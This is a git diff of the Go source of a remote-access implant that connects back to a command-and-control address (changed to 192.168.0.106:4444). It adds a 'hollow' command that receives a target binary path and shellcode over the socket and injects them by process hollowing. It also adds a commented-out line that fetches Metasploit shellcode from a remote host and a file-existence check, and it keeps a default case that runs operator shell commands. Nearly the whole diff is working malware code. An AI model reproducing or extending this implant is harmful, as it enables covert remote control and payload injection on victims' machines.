@@ -9,6 +9,7 @@ import (
 	"strings"
 	"syscall"
 	"time"
+	//"github.com/D3Ext/maldev/shellcode"
 	// "github.com/faiface/beep"
 	// "github.com/faiface/beep/mp3"
 	// "github.com/faiface/beep/speaker"
@@ -154,7 +155,7 @@ func ls(conn *net.Conn, implantWD *string) {
 // }
 
 func main() {
-	c2Address := "192.168.5.222:321"
+	c2Address := "192.168.0.106:4444"
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
@@ -207,6 +208,86 @@ func main() {
 			{
 				fmt.Println(implantWD)
 				conn.Write([]byte(implantWD))
+			}
+		case "hollow\n":
+			{
+				//Ez way
+				// sc, err := shellcode.GetShellcodeFromUrl("http://192.168.0.106:80/msf.bin")
+				// if err != nil {
+				// 	fmt.Println("Couldn't get shellcode")
+				// 	return
+				// }
+
+				//Hardcore method below
+				conn.Write([]byte("OK\n"))
+				//Check if the file even exists
+				buffer := make([]byte, 60838412)
+				read_len, err := conn.Read(buffer)
+				if err != nil {
+					fmt.Println("Problem Reading the buffer")
+					conn.Write([]byte("Return"))
+					return
+				}
+				if read_len <= 1 {
+					fmt.Println("Problem with Buffer Size")
+					conn.Write([]byte("Return"))
+					return
+				}
+				filePath := string(buffer[:read_len])
+				fmt.Println(filePath)
+				//filePath = "C:\\Program Files\\Internet Explorer\\iexplore.exe"
+				_, err = os.Stat(filePath)
+				if err != nil {
+					fmt.Println("The binary does not exist !!! Path: " + filePath)
+					fmt.Println()
+					conn.Write([]byte("File does not exist"))
+					return
+				}
+				conn.Write([]byte("OK\n"))
+				fmt.Println("The file exists and is readable: " + filePath)
+
+				//Create a buffer to recieve the shellcode and fire it
+				read_len, err = conn.Read(buffer)
+				if err != nil {
+					fmt.Println("Problem Reading the buffer")
+					conn.Write([]byte("Return"))
+					return
+				}
+				if read_len <= 1 {
+					fmt.Println("Problem with Buffer Size")
+					conn.Write([]byte("Return"))
+					return
+				}
+				sc := buffer[:read_len]
+				conn.Write([]byte("OK\n"))
+				fmt.Println("Shellcode Recieved Commencing Hollowing")
+				hollow(&conn, sc, filePath)
+			}
+		case "check\n":
+			{
+				//fileLocal := "C:\\Program Files\\Internet Explorer\\iexplore.exe" //Works
+				conn.Write([]byte("OK\n"))
+				buffer := make([]byte, 100000)
+				read_len, err := conn.Read(buffer)
+				if err != nil {
+					fmt.Println("Problem Reading the buffer")
+					conn.Write([]byte("Return"))
+					return
+				}
+				if read_len <= 1 {
+					fmt.Println("Problem with Buffer Size")
+					conn.Write([]byte("Return"))
+					return
+				}
+				bufferSnapped := buffer[:read_len]
+				fileLocal := string(bufferSnapped)
+				fmt.Println("Done with the buffer stuff checking if file exists ...")
+				_, err = os.Stat(fileLocal)
+				if err != nil {
+					fmt.Println("File dont exist")
+					return
+				}
+				fmt.Println("File Exists !!!")
 			}
 		default: //TO-DO: turning the default into an error statement and appending all shell commands with a ">.<" to avoid crashes
 			executeCommands(&conn, &command)
